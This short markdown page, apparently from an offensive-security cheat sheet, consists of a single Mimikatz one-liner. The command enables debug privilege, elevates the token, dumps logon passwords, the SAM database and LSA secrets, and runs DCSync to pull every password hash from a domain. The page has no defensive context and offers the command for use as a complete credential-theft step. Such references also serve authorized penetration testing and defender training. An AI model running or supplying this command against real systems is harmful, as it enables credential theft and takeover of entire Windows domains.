---
title: "Mimikatz"
---

# Mimikatz

Full credential dump one-liner with Mimikatz: enables debug privilege, elevates token, extracts logon passwords, SAM, LSA secrets, and runs DCSync to replicate hashes from the entire domain.

```shell
.\mimikatz.exe "privilege::debug" "Token::Elevate" "sekurlsa::LogonPasswords" "lsadump::sam" "lsadump::lsa /patch" "lsadump::secrets" "lsadump::dcsync /domain:final.com /all /csv" "exit"
```
